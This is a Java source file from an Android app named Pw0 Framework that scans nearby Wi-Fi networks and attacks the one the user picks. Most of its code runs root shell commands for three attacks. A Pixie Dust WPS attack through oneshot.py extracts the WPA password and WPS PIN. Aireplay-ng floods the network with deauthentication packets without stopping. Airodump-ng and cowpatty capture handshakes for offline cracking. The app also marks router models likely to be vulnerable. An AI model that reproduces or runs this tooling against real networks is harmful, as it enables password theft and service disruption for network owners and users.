package com.huntmix.pw0boom;


import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Dialog;
import android.content.Context;
import android.hardware.usb.UsbDevice;
import android.hardware.usb.UsbManager;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Handler;
import android.telephony.CellSignalStrength;
import android.text.Html;
import android.text.Spanned;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.RadioButton;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.recyclerview.widget.RecyclerView;

import com.google.android.material.bottomsheet.BottomSheetDialog;
import com.google.android.material.snackbar.Snackbar;
import com.topjohnwu.superuser.CallbackList;
import com.topjohnwu.superuser.Shell;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import ir.alirezabdn.wp7progress.WP10ProgressBar;
import ir.alirezabdn.wp7progress.WP7ProgressBar;
import pl.droidsonroids.gif.GifImageView;

public class Adapter extends RecyclerView.Adapter<Adapter.ViewHolder> {
    public ArrayList<ArrayList<String>> wifi = new ArrayList<>();
    public Context justcontext;
    public String name;
    public String power;
    public String bssid;
    public Activity act;
    public boolean mon;
    public TextView out;
    public BottomSheetDialog usbdialog;
    public  int status = 0;
    public Button button;
    public int delayAnimate = 50;
    public Button deauth;
    public String busybox = "su -c /data/data/com.huntmix.pw0boom/cache/busybox";
    public Button cancel;
    public int hs_status = 0;
    public int usb = 0;
    public  int time = 0;
    public TinyDB tinydb;
    public String chroot;
    public int timerok = 0;
    public List<String> output = new ArrayList<>();
    public Adapter(Context context,Activity mActivity, ArrayList<ArrayList<String>> list) {
        justcontext = context;
        wifi = list;
        act = mActivity;
        tinydb = new TinyDB(justcontext);
        chroot = tinydb.getString("chroot_path");
        Collections.sort(wifi, new Comparator<ArrayList<String>>() {
            @Override
            public int compare(ArrayList<String> o1, ArrayList<String> o2) {
                return Integer.valueOf(o1.get(1)).compareTo(Integer.valueOf(o2.get(1)));
            }
        });
        Collections.reverse(wifi);

    }

    public static class ViewHolder extends RecyclerView.ViewHolder {

        public TextView bssid;
        public TextView essid;
        public TextView power;
        public TextView wps;
        public TextView model;
        public ImageView star;
        public ImageView wifiicon;

        public RelativeLayout fullitem;

        public ViewHolder(View v) {
            super(v);

            bssid =  v.findViewById(R.id.bssid);
            essid =  v.findViewById(R.id.essid);
            power =  v.findViewById(R.id.power);
            fullitem =  v.findViewById(R.id.item);
            model =  v.findViewById(R.id.model);
            wps = v.findViewById(R.id.wps);
            star = v.findViewById(R.id.star);
            wifiicon =v.findViewById(R.id.wifiicon);

        }

    }

    @Override
    public ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {

        View v = LayoutInflater.from(justcontext).inflate(R.layout.wifi_item, parent, false);
        return new ViewHolder(v);
    }

    @Override
    public void onBindViewHolder(ViewHolder holder, @SuppressLint("RecyclerView") final int position) {
        Log.e("Adapter",String.valueOf(wifi.get(position))+wifi.get(position).size());
        if (tinydb.getBoolean("hidemac")){bssid = "XX:XX:XX:XX:XX";}else{bssid =  wifi.get(position).get(0).toUpperCase();}
        if (tinydb.getBoolean("hideap")){name = "Network_"+position;}else{name =  wifi.get(position).get(2);}
        power = wifi.get(position).get(1);
        if (wifi.get(position).size() >5){
            String modelka = wifi.get(position).get(5);
            if (modelka.contains("Archer") || modelka.contains("TL-WR") || modelka.contains("TL-WA") || modelka.contains("TL-MR") || modelka.contains("WPS") || modelka.contains("Wi-Fi") || modelka.contains("RTL8") || modelka.contains("DIR")){
                holder.star.setVisibility(View.VISIBLE);
            }
            holder.model.setText("Model: "+modelka);
        }
        else{
            holder.model.setText("N/A");
        }
        if (wifi.get(position).size() >4){
            holder.wps.setTextColor(justcontext.getColor(R.color.green));
        }else{
            holder.wps.setTextColor(justcontext.getColor(R.color.red));
            holder.star.setVisibility(View.INVISIBLE);
        }
        holder.essid.setText(bssid);
        if (Integer.parseInt(wifi.get(position).get(3))>20){
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                holder.bssid.setText(Html.fromHtml(name+"<b><i> (5 GHz)</b></i> ", Html.FROM_HTML_MODE_COMPACT));
            } else {
                holder.bssid.setText(Html.fromHtml(name+"<b><i> (5 GHz)</b></i> "));
            }
        }else{
            holder.bssid.setText(name);}
        holder.power.setText(power);
        if (Integer.parseInt(power)< -80){
            holder.power.setTextColor(justcontext.getColor(R.color.red));
            holder.wifiicon.setImageDrawable(justcontext.getDrawable(R.drawable.wifilow));
        }else if (Integer.parseInt(power)< -65){
            holder.power.setTextColor(justcontext.getColor(R.color.yellow));
            holder.wifiicon.setImageDrawable(justcontext.getDrawable(R.drawable.wifimedium));
        }else if (Integer.parseInt(power)< 0){
            holder.power.setTextColor(justcontext.getColor(R.color.green));
            holder.wifiicon.setImageDrawable(justcontext.getDrawable(R.drawable.wififull));
        }
        holder.fullitem.setVisibility(View.INVISIBLE);
        setAnimation(holder.fullitem);
        holder.fullitem.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                WifiDialog(position,wifi.get(position).get(2),wifi.get(position).get(0));
            }
        });


    }

    @Override
    public int getItemCount() {
        // Count the installed apps
        return wifi.size();
    }
    public void error(String errormsg){
        Dialog dialog = new Dialog(justcontext,R.style.AppBottomSheetDialogTheme);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setCancelable(true);
        LayoutInflater inflater = (LayoutInflater) justcontext.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        View view = inflater.inflate(R.layout.error_dialog, null, false);
        TextView error = view.findViewById(R.id.describe);
        error.setText(errormsg);
        ((Activity) justcontext).getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_STATE_VISIBLE | WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE);
        dialog.setContentView(view);
        final Window window = dialog.getWindow();
        window.setLayout(WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.WRAP_CONTENT);
        window.setGravity(Gravity.CENTER);
        dialog.show();
    }
    private void WifiDialog(int id,String name,String mac) {
        final BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(justcontext,R.style.AppBottomSheetDialogTheme);
        bottomSheetDialog.setContentView(R.layout.wifi_dialog);
        TextView bssid = bottomSheetDialog.findViewById(R.id.wifi_name);
        TextView essid = bottomSheetDialog.findViewById(R.id.wifi_mac);
        TextView pixiedust = bottomSheetDialog.findViewById(R.id.pixie);
        TextView handshake = bottomSheetDialog.findViewById(R.id.hs);
        TextView deauthlaunch = bottomSheetDialog.findViewById(R.id.deather);
        if (tinydb.getBoolean("hidemac")){essid.setText("XX:XX:XX:XX:XX");}else{
            essid.setText(mac);    }
        bssid.setText(name);
        deauthlaunch.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                try {
                    startdeauth(wifi.get(id).get(0),wifi.get(id).get(2),wifi.get(id).get(3));
                } catch (IOException e) {
                    e.printStackTrace();
                }

            }
        });
        handshake.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                try {
                    bottomSheetDialog.dismiss();
                    passivehandshake("wlan0",wifi.get(id).get(0),wifi.get(id).get(2),wifi.get(id).get(3));
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });

        pixiedust.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (wifi.get(id).size()<4){
                    error("This network doesn`t have WPS on!");
                }else{
                    runpixie(justcontext,wifi.get(id).get(0));
                }

            }
        });

        bottomSheetDialog.show();

    }
    public void runpixie(final Context context,String bssid) {
        WifiManager wifiManager = (WifiManager) justcontext.getSystemService(Context.WIFI_SERVICE);
        if (!wifiManager.isWifiEnabled()){
            output = new ArrayList<>();
            status = 0;
            time = 0;

            Shell.su("rm -rf "+chroot+"/root/.OneShot").exec();
            Dialog dialog = new Dialog(context,R.style.AppBottomSheetDialogTheme);
            dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
            dialog.setCancelable(false);
            LayoutInflater inflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
            View view = inflater.inflate(R.layout.pixiedialog, null, false);
            WP10ProgressBar progress = view.findViewById(R.id.indicator);
            Button cancel = view.findViewById(R.id.pixiecancel);
            progress.showProgressBar();
            ((Activity) context).getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_STATE_VISIBLE | WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE);
            dialog.setContentView(view);
            final Window window = dialog.getWindow();
            window.setLayout(WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.WRAP_CONTENT);
            window.setGravity(Gravity.CENTER);
            dialog.show();
            cancel.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    try {
                        Runtime.getRuntime().exec(busybox+" chroot "+chroot+" /usr/bin/sudo pkill -e oneshot.py");
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    dialog.dismiss();
                }
            });

            List<String> callbackList = new CallbackList<String>() {
                @Override
                public void onAddElement(String s) { output.add(s);
                    if (s.contains("[+] AP SSID:")){
                        status = 1;
                    } else if (s.contains("[-] WPS pin not found!") || s.contains("[!] Not enough data to run Pixie Dust attack")){
                        status = 2;
                    }
                }
            };
            Shell.su(busybox+" chroot "+chroot+" /usr/bin/sudo timeout 30 python3 /oneshot.py -i wlan0 --iface-down -K -b "+bssid)
                    .to(callbackList)
                    .submit();

            Timer timer=new Timer();
            timer.scheduleAtFixedRate(new TimerTask() {
                @Override
                public void run() {
                    act.runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            if (status == 1){
                                String pass = output.get(output.size()-2).replace("[+] WPA PSK: ","").replace("'","");
                                String wps = output.get(output.size()-3).replace("[+] WPS PIN: ","").replace("'","");
                                String ssid = output.get(output.size()-1).replace("[+] AP SSID: ","").replace("'","");
                                try {
                                    result(context,ssid,wps,pass);
                                } catch (IOException e) {
                                    e.printStackTrace();
                                }
                                dialog.dismiss();
                                timer.cancel();
                            }
                            if (status == 2){
                                try {
                                    result(context,"ERROR"," "," ");
                                } catch (IOException e) {
                                    e.printStackTrace();
                                }
                                dialog.dismiss();
                                timer.cancel();
                            }
                            time = time +1;
                            if (time > 29){
                                try {
                                    result(context,"TIMEOUT ERROR"," "," ");
                                } catch (IOException e) {
                                    e.printStackTrace();
                                }
                                dialog.dismiss();
                                timer.cancel();
                            }
                        }
                    });



                }
            }, 0, 1000);}
        else {
            Toast toast = Toast.makeText(justcontext,
                    "Turn off WIFI first!", Toast.LENGTH_SHORT);
            toast.show();
        }


    }
    public void result(Context ctx,String name,String wps,String password) throws IOException {
        Dialog dialog = new Dialog(ctx,R.style.AppBottomSheetDialogTheme);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        Runtime.getRuntime().exec(busybox+" chroot "+chroot+" /usr/bin/sudo pkill -e oneshot.py");
        LayoutInflater inflater = (LayoutInflater) ctx.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        View view = inflater.inflate(R.layout.password_find, null, false);
        TextView ssid = view.findViewById(R.id.ssid);
        TextView pass = view.findViewById(R.id.passwrodget);
        TextView pin = view.findViewById(R.id.wpsget);
        TextView copy = view.findViewById(R.id.copy);
        ImageView pic = view.findViewById(R.id.pixpic);
        pass.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                setClipboard(ctx,password);
            }
        });
        pin.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                setClipboard(ctx,wps);
            }
        });
        if (name.equals("TIMEOUT ERROR")){
            pic.setImageDrawable(ctx.getDrawable(R.drawable.timeout));
            copy.setVisibility(View.INVISIBLE);
            ssid.setTextColor(ctx.getColor(R.color.red));
            pin.setTextColor(ctx.getColor(R.color.red));
            pin.setText("This router is not vulnerable \n Or signal too weak");
            pass.setVisibility(View.INVISIBLE);
        }
        if (tinydb.getBoolean("apname")){
            ssid.setText("Network_XXX");
        }else{
            ssid.setText(name);
        }
        pass.setText(pass.getText()+" "+password);
        pin.setText(pin.getText()+" "+wps);
        if (name.equals("ERROR")){
            pic.setImageDrawable(ctx.getDrawable(R.drawable.nonvuln));
            ssid.setTextColor(ctx.getColor(R.color.red));
            pin.setTextColor(ctx.getColor(R.color.red));
            pin.setText("This router is not vulnerable");
            pass.setVisibility(View.INVISIBLE);
            copy.setVisibility(View.INVISIBLE);
        }
        ((Activity) ctx).getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_STATE_VISIBLE | WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE);
        dialog.setContentView(view);
        final Window window = dialog.getWindow();
        window.setLayout(WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.WRAP_CONTENT);
        window.setGravity(Gravity.CENTER);
        dialog.show();

    }

    private void setClipboard(Context context, String text) {
        if(android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.HONEYCOMB) {
            android.text.ClipboardManager clipboard = (android.text.ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
            clipboard.setText(text);
        } else {
            android.content.ClipboardManager clipboard = (android.content.ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
            android.content.ClipData clip = android.content.ClipData.newPlainText("DATA", text);
            clipboard.setPrimaryClip(clip);
        }
    }

    private void passivehandshake(String wlan,String bssid,String apname,String channel) throws IOException {
        final BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(justcontext,R.style.AppBottomSheetDialogTheme);
        bottomSheetDialog.setContentView(R.layout.handshake_dialog);
        TextView status = bottomSheetDialog.findViewById(R.id.hs_status);
        GifImageView gif = bottomSheetDialog.findViewById(R.id.gifka);
        checkmonitore();
        timerok = 0;
        usb = 0;
        final boolean[] deauther = {false};
        Shell.su("rm /storage/emulated/0/Pw0/hs/handshake-01.cap").exec();
        Shell.su("mkdir /storage/emulated/0/Pw0/hs/").exec();
        bottomSheetDialog.setCancelable(false);
        Button cancel = bottomSheetDialog.findViewById(R.id.hs_cancel);
        deauth = bottomSheetDialog.findViewById(R.id.deauth);
        deauth.setOnLongClickListener(new View.OnLongClickListener() {
            @Override
            public boolean onLongClick(View v) {
                setwlan();
                return false;
            }
        });
        out = bottomSheetDialog.findViewById(R.id.hsoutput);

        out.append("Pw0 Framework\n");
        out.append("Version 0.2 BETA (by @Huntmix) \n\n");
        TextView ap = bottomSheetDialog.findViewById(R.id.ap);
        TextView timer = bottomSheetDialog.findViewById(R.id.time);
        if (tinydb.getBoolean("apname")){
            ap.setText("AP: Network_XXX");}else {
            ap.setText("AP: "+apname);
        }
        Timer detimer = new Timer();
        deauth.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String wlan2 = tinydb.getString("wlan2");
                if (usb == 1 && checkdevice().size()>0 && !deauther[0]){
                    out.append(green("Started "+wlan2+" monitor mode..."));
                    out.append("\n");
                    String command = busybox+" chroot "+chroot+" /usr/bin/sudo airmon-ng start "+wlan2+" "+channel;
                    Shell.su(command).submit();
                    deauth.setText("Start Deauth");
                    usb = 2;
                }else if (usb == 2){
                    out.append(green("Started deauthing on channel: "+channel)+". (15s)");out.append("\n");
                    String command = busybox+" chroot "+chroot+" /usr/bin/sudo aireplay-ng -0 5 "+wlan2+"mon -a "+bssid;

                    detimer.scheduleAtFixedRate(new TimerTask() {
                        @Override
                        public void run() {
                            act.runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    try {
                                        Runtime.getRuntime().exec(command);
                                        out.append(green("Deauthing... "));out.append("\n");
                                    } catch (IOException e) {
                                        e.printStackTrace();
                                    }
                                    deauth.setText("STOP DEAUTHING");
                                }
                            });

                        }
                    },0,15000);
                    deauther[0] = true;
                    usb = 4;
                }
                else if(deauther[0]){
                    Shell.su(busybox+" chroot "+chroot+" /usr/bin/sudo airmon-ng stop "+wlan2+"mon").submit();
                    out.append("Stopped deauthing");
                    detimer.cancel();
                    out.append("\n");
                    deauth.setText("Start Deauthing");
                }
                else{
                    showusbdialog();
                }
            }
        });

        Timer time = new Timer();
        out.setMovementMethod(new ScrollingMovementMethod());
        cancel.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Shell.su(busybox+" chroot "+chroot+" /usr/bin/sudo pkill -e airodump-ng").exec();
                bottomSheetDialog.dismiss();
                if (time!=null){
                    time.cancel();}
                Shell.su("rm /storage/emulated/0/Pw0/hs/handshake-01.cap").exec();
            }
        });
        timer.setText("Elapsed time: "+timerok+"s");


        if (!mon) {
            start();
            out.append(yellow("Enabling monitor mode.."));
            out.append("\n");
            checkmonitore();
            if (!mon){

                out.append(red("Unsupported "+wlan+" device"));
                out.append("\n");
                gif.setBackgroundResource(R.drawable.caterror);
                status.setText("Wlan error");
                cancel.setText("RETURN");
                gif.setBackgroundResource(R.drawable.catload);
                time.cancel();

            }
        }
        if (mon){
            out.append(green("Checking "+wlan+"... OK"));
            out.append("\n");
            out.append(green("Starting airmon-ng..."));
            out.append("\n");
            String command = busybox+" chroot "+chroot+" /usr/bin/sudo airodump-ng";
            String cmd = "su -c " + command + " " + wlan + " -w /sdcard/Pw0/hs/handshake --ignore-negative-one --output-format pcap --bssid "+bssid;
            Runtime.getRuntime().exec(cmd);
            //checking env



            time.scheduleAtFixedRate(new TimerTask() {
                @Override
                public void run() {
                    gif.setBackgroundResource(R.drawable.catlisten);
                    timerok = timerok + 10;
                    timer.setText("Elapsed time: "+timerok+"s");
                    act.runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            List<String> callbackList = new CallbackList<String>() {
                                @Override
                                public void onAddElement(String s) {
                                    if (timerok >11){
                                        if (s.contains("different")){
                                            status.setText("Listening...");
                                            if (hs_status!=2){
                                                hs_status = 1;
                                                out.append(yellow("Checking handshake ... "));out.append("\n");

                                            }
                                        }else if (s.contains("all")){
                                            hs_status = 2;
                                            status.setText("Success!..");
                                            if (tinydb.getBoolean("hideap") && tinydb.getBoolean("hidemac")){
                                                out.append(green("Successfully captured handshake for Network_XXX (XX:XX:XX:XX:XX) Elapsed time:" +timerok));

                                            }else if (!tinydb.getBoolean("hideap") && tinydb.getBoolean("hidemac")){
                                                out.append(green("Successfully captured handshake for "+apname+"(XX:XX:XX:XX:XX) Elapsed time:" +timerok));
                                            }else if (tinydb.getBoolean("hideap") && !tinydb.getBoolean("hidemac")){
                                                out.append(green("Successfully captured handshake for Network_XXX("+bssid+") Elapsed time:" +timerok));
                                            }else{
                                                out.append(green("Successfully captured handshake for "+apname+"("+bssid+") Elapsed time:" +timerok));}
                                            out.append("\n");
                                            gif.setBackgroundResource(R.drawable.catok);
                                            detimer.cancel();
                                            try {
                                                Runtime.getRuntime().exec("cp /storage/emulated/0/Pw0/hs/handshake-01.cap /storage/emulated/0/Pw0/hs/"+apname+".cap");
                                            } catch (IOException e) {
                                                e.printStackTrace();
                                            }
                                            if (tinydb.getBoolean("apname")){out.append(green("Renaming ... Saved to /sdcard/Pw0/hs/Network_XXX.cap"));}else{
                                                out.append(green("Renaming ... Saved to /sdcard/Pw0/hs/"+apname+".cap"));}
                                            out.append("\n");
                                            Shell.su(busybox+" chroot "+chroot+" /usr/bin/sudo airmon-ng stop "+wlan+"mon").submit();
                                            deauth.setVisibility(View.INVISIBLE);
                                            cancel.setText("FINISH");
                                            time.cancel();
                                        }


                                    }



                                }
                            };

                            if (hs_status == 0 && timerok > 21){
                                status.setText("Unknown error");
                                out.append(red("Error code [-2]: Look likes chroot error or something tools don`t installed!"));  out.append("\n");
                                time.cancel();
                                cancel.setText("Return");

                            }
                            Shell.su(busybox+" chroot "+chroot+" /usr/bin/sudo cowpatty -c -r /sdcard/Pw0/hs/handshake-01.cap")
                                    .to(callbackList)
                                    .submit();

                        }
                    });
                }
            }, 0, 10000);}
        bottomSheetDialog.show();
    }
    public void setwlan(){
        Dialog dialog = new Dialog(justcontext,R.style.AppBottomSheetDialogTheme);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setCancelable(false);
        LayoutInflater inflater = (LayoutInflater) justcontext.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        View view = inflater.inflate(R.layout.setwlan, null, false);
        RadioButton w0 = view.findViewById(R.id.wl0);
        RadioButton w1 = view.findViewById(R.id.wl1);
        RadioButton w2 = view.findViewById(R.id.wl2);
        RadioButton w3 = view.findViewById(R.id.wl3);
        w0.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                tinydb.putString("wlan2","wlan0");

                dialog.dismiss();
            }
        });
        w1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                tinydb.putString("wlan2","wlan1");

                dialog.dismiss();
            }
        });
        w2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                tinydb.putString("wlan2","wlan2");

                dialog.dismiss();
            }
        });
        w3.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                tinydb.putString("wlan2","wlan3");

                dialog.dismiss();
            }
        });
        dialog.setContentView(view);
        final Window window = dialog.getWindow();
        window.setLayout(WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.WRAP_CONTENT);
        window.setGravity(Gravity.CENTER);
        dialog.show();
    }
    private void startdeauth(String bssid,String apname,String channel) throws IOException {
        final BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(justcontext,R.style.AppBottomSheetDialogTheme);
        bottomSheetDialog.setContentView(R.layout.deauth_dialog);
        TextView status = bottomSheetDialog.findViewById(R.id.deauth_status);
        TextView timer = bottomSheetDialog.findViewById(R.id.timerdeauth);
        GifImageView gif = bottomSheetDialog.findViewById(R.id.gifdeauth);
        checkmonitore();
        timerok = 0;
        usb = 0;
        bottomSheetDialog.setCancelable(false);
        Button cancel = bottomSheetDialog.findViewById(R.id.hs_cancel);
        deauth = bottomSheetDialog.findViewById(R.id.deauthbutton);
        out = bottomSheetDialog.findViewById(R.id.deauth_output);
        out.append("Pw0 Framework\n");
        out.append("Version 0.2 BETA (by @Huntmix) \n\n");
        out.append(yellow("Waiting for usb device ..."));

        out.append("\n");Timer time = new Timer();time.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                act.runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        timerok = timerok +1;
                        timer.setText("Elapsed time: "+timerok+"s");
                    }
                });

            }
        },0,1000);

        TextView ap = bottomSheetDialog.findViewById(R.id.ap);
        if (tinydb.getBoolean("apname")){
            ap.setText("AP: Network_XXX");}else {
            ap.setText("AP: "+apname);
        }
        deauth.setOnClickListener(new View.OnClickListener() {
            String wlan2 = tinydb.getString("wlan2");
            @Override
            public void onClick(View v) {
                if (usb == 1 && checkdevice().size()>0){
                    out.append(green("Started "+wlan2+" monitor mode..."));
                    out.append("\n");
                    String command = busybox+" chroot "+chroot+" /usr/bin/sudo airmon-ng start "+wlan2+" "+channel;
                    Shell.su(command).submit();
                    deauth.setText("Start Deauth");
                    usb = 2;
                }else if (usb == 2){

                    status.setText("Started deauthing...");
                    gif.setBackgroundResource(R.drawable.catload);
                    out.append(green("Started deauthing on channel: "+channel));
                    out.append("\n");
                    out.append(yellow("Don`t be so rude! ;)"));
                    out.append("\n");
                    String command = busybox+" chroot "+chroot+" /usr/bin/sudo aireplay-ng -0 0 "+wlan2+"mon -a "+bssid;
                    String cmd = "su -c " + command;
                    try {
                        Runtime.getRuntime().exec(cmd);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }

                    usb = 3;
                    deauth.setText("Stop deauthing");
                }
                else if(usb == 3){
                    status.setText("Waiting usb...");
                    gif.setBackgroundResource(R.drawable.catlisten);
                    Shell.su(busybox+" chroot "+chroot+"/ /usr/bin/sudo pkill -e aireplay-ng").exec();
                    Shell.su(busybox+" chroot "+chroot+" /usr/bin/sudo airmon-ng stop "+wlan2+"mon").submit();
                    out.append(red("Stopped deauthing"));
                    out.append("\n");
                    deauth.setText("Connect usb");
                    time.cancel();
                    usb = 0;
                }
                else{
                    showusbdialog();
                }
            }
        });


        out.setMovementMethod(new ScrollingMovementMethod());
        cancel.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Shell.su(busybox+" chroot "+chroot+" /usr/bin/sudo pkill -e aireplay-ng").exec();
                bottomSheetDialog.dismiss();
                if (time!=null){
                    time.cancel();}

            }
        });


        bottomSheetDialog.show();
    }

    public void checkmonitore(){
        List<String> out = output(busybox+" chroot "+chroot+" /usr/bin/sudo iw dev");
        List<String> clear = new ArrayList<>();
        for (int j = 0;j < out.size();j++){
            String temp = out.get(j).replaceAll("\\s+","");
            clear.add(temp);}
        Log.e("Log", String.valueOf(clear));
        if (clear.contains("typemanaged")){
            mon = false;
        } else if (clear.contains("typemonitor")){
            mon = true;
        }

    }
    public List<String> output(String command){
        List<String> logs = new ArrayList<>();

        Shell.su(command).to(logs).exec();

        return logs;
    }
    public void start() {
        String wlan = tinydb.getString("wlan");
        if (wlan.equals("wlan0")){
            Shell.su("ip link set wlan0 down").exec();
            Shell.su("echo 4 > /sys/module/wlan/parameters/con_mode").exec();
            Shell.su("ip link set wlan0 up").exec();}
        else {
            Shell.su(busybox+" chroot "+chroot+" /usr/bin/sudo airmon-ng start "+wlan);
        }}
    public void off() {
        Shell.su("ip link set wlan0 down").exec();
        Shell.su("ip link set wlan0 up").exec();
        Shell.su("echo 0 > /sys/module/wlan/parameters/con_mode").exec();
        Shell.su("svc wifi enable").exec(); }
    public Spanned green (String out){
        Spanned formated = Html.fromHtml("<font color='#19D121'>[+]"+out+"</font>");
        return formated;
    }
    public Spanned yellow (String out){
        Spanned formated = Html.fromHtml("<font color='#F9D625'>[!]"+out+"</font>");
        return formated;
    }
    public Spanned red (String out){
        Spanned formated = Html.fromHtml("<font color='#F60B0B'>[-]"+out+"</font>");
        return formated;
    }
    private void showusbdialog() {
        usbdialog = new BottomSheetDialog(justcontext,R.style.AppBottomSheetDialogTheme);
        usbdialog.setContentView(R.layout.usb_dialog);
        usbdialog.setCancelable(false);
        TextView status = usbdialog.findViewById(R.id.status);
        TextView usbinfo = usbdialog.findViewById(R.id.usbinfo);
        TextView drivercheck = usbdialog.findViewById(R.id.drivercheck);
        TextView detected = usbdialog.findViewById(R.id.detected);
        WP10ProgressBar progress = usbdialog.findViewById(R.id.checkbar);
        WP7ProgressBar wait = usbdialog.findViewById(R.id.waitbar);
        Button button = usbdialog.findViewById(R.id.monbutton);
        wait.showProgressBar();
        progress.showProgressBar();
        button.setVisibility(View.INVISIBLE);
        cancel = usbdialog.findViewById(R.id.dismiss);
        cancel.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                usbdialog.dismiss();
            }
        });
        Timer timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                act.runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        String wlan2 = tinydb.getString("wlan2");
                        if (!checkdevice().isEmpty()){
                            List<String> temp = checkdevice();
                            status.setTextColor(justcontext.getColor(R.color.green));
                            status.setText("Connected");
                            wait.setVisibility(View.INVISIBLE);
                            usbinfo.setVisibility(View.VISIBLE);
                            usbinfo.setText(temp.get(1)+" ("+temp.get(2)+":"+temp.get(3)+")");
                            drivercheck.setVisibility(View.VISIBLE);
                            progress.setVisibility(View.VISIBLE);
                            if (temp.get(2).equals("0cf3")){
                                detected.setVisibility(View.VISIBLE);
                                detected.setText("Detected: TL-WN722N (1.0)");
                            }

                            List<String> callbackList = new CallbackList<String>() {
                                @Override
                                public void onAddElement(String s) {
                                    String temp2 = s.replaceAll("\\s+","").replace("*","");
                                    if (temp2.contains(wlan2)){
                                        progress.setIndicatorColor(R.color.green);
                                        drivercheck.setText(drivercheck.getText()+"   OK");
                                        out.append(green("Detected "+wlan2+" "+ temp.get(1)+"("+temp.get(2)+":"+temp.get(3)+")"));
                                        out.append("\n");
                                        usb = 1;
                                        usbdialog.dismiss();
                                        deauth.setText("Start monitor mode ");
                                    }

                                    timer.cancel();
                                }
                            };
                            Shell.su(busybox+" chroot "+chroot+" /usr/bin/sudo airmon-ng | grep "+wlan2+" ")
                                    .to(callbackList)
                                    .submit();


                        }
                    }
                });
            }
        }, 0, 1000);


        usbdialog.show();

    }
    public List<String> checkdevice(){
        List<String> temp = new ArrayList<>();
        UsbManager manager = (UsbManager) justcontext.getSystemService(Context.USB_SERVICE);
        HashMap<String, UsbDevice> devices = manager.getDeviceList();
        Iterator<String> it = devices.keySet().iterator();

        while (it.hasNext()) {
            String deviceName = it.next();
            UsbDevice device = devices.get(deviceName);
            String string = device.getProductName();
            String manu = device.getManufacturerName();
            String string2 = Integer.toHexString(device.getVendorId());
            while (string2.length() < 4) {
                string2 = "0" + string2;
            }
            String string3 = Integer.toHexString(device.getProductId());
            while (string3.length() < 4) {
                string3 = "0" + string3;
            }
            temp.add(string);
            temp.add(manu);
            temp.add(string2);
            temp.add(string3);
        }
        return temp;
    }
    private void setAnimation(final View view) {
        Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            public void run() {
                Animation animation = AnimationUtils.loadAnimation(justcontext, R.anim.zoom);
                if(view!=null){
                    view.startAnimation(animation);
                    view.setVisibility(View.VISIBLE);
                }
            }
        }, delayAnimate);
        delayAnimate+=30;
    }
}